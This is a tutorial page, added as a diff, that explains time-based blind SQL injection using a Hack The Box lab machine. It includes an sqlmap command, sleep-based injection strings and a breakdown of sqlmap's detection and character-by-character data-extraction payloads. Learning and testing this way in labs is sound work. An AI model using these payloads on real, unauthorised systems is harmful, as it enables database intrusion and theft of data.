@@ -1,0 +1,105 @@
+---
+description: >-
+  Looking into a Time-based blind vulnerability using SQLMap and looking at the
+  payload.
+cover: ../.gitbook/assets/growtika-ZfVyuV8l7WU-unsplash (2).jpg
+coverY: 0
+---
+
+# Time-based blind SQL injection
+
+An example of the vulnerability can found in https://app.hackthebox.com/machines/Love. Using SQLMap the vulnerability can easily found. This vulnerability was not the intended path for the box Love.
+
+```bash
+sqlmap -u http://10.10.10.239/index.php --batch --forms 
+```
+
+<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption><p>use --technique=T flag for time based only.</p></figcaption></figure>
+
+### What is a Time-Based blind injection.
+
+First of all a SQL injection is a code injection technique used to exploit vulnerabilities in a websites database which in this case is MySQL. This can happen when there is no proper sanitization on the user input.&#x20;
+
+#### A SQL query
+
+```sql
+select * from logins where username like '%$searchInput'
+```
+
+If there is no sanitization we can add a single quote which will end the user input and after this we can write more SQL code.&#x20;
+
+#### For example, retrieving databases.
+
+```sql
+select * from logins where username like '%1'; show databases;'
+```
+
+### Blind injection
+
+Blind injections are injections without receiving meaningful error messages or data output being returned. We have to use SQL logic to retrieve the output character by character.&#x20;
+
+### Time Based
+
+A Time-based blind SQL Injection involves sending SQL queries that cause the SQL server to wait for a specified amount of time before responding. This delay for example 5 seconds indicates the query has been executed.&#x20;
+
+<pre class="language-sql"><code class="lang-sql"># Sleeps only if condition is true
+<strong>test' or pg_sleep(5)--
+</strong><strong>' or sleep(5)#
+</strong>') or sleep(5)='
+</code></pre>
+
+### The payload
+
+Because time-based injections retrieving data char by char doing it manually would be a tedious and time consuming task. This is the actual payload SQLMap is using to detect the vulnerability.
+
+```sql
+test' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+```
+
+### Lets break this down
+
+The sinqle ( ' ) it terminate the string and allows to inject a command
+
+```sql
+test'
+```
+
+`AND` clause is used in SQL to combine conditions,&#x20;
+
+```sql
+AND
+```
+
+The subquery&#x20;
+
+```sql
+(SELECT(SLEEP(5)))
+```
+
+* `SLEEP(5)` causes a 5 second delay
+* `SELECT` statement executes SLEEP() which results in a 5 second delay
+
+The outer query
+
+```sql
+SELECT * FROM (SELECT(SLEEP(5)))bAKL
+```
+
+* `SELECT *` will select all columns
+* `FROM (SELECT(SLEEP(5)))` This nested structure ensures the SLEEP() function will execute
+* bAKL is as an alias which is needed when using a subquery.&#x20;
+
+Closing the payload
+
+```sql
+AND 'vRxe'='vRxe'
+```
+
+* Is always TRUE like 1 =1
+* Closes any quotes and ensures valid SQL syntax
+* Bypass security measures
+
+{% hint style="info" %}
+Based on this payload SQLMap will retrieve the database char by char. `test' AND (SELECT 9684 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),2,1))>120,0,1)))))SpGB) AND 'vRxe'='vRxe`
+{% endhint %}
+
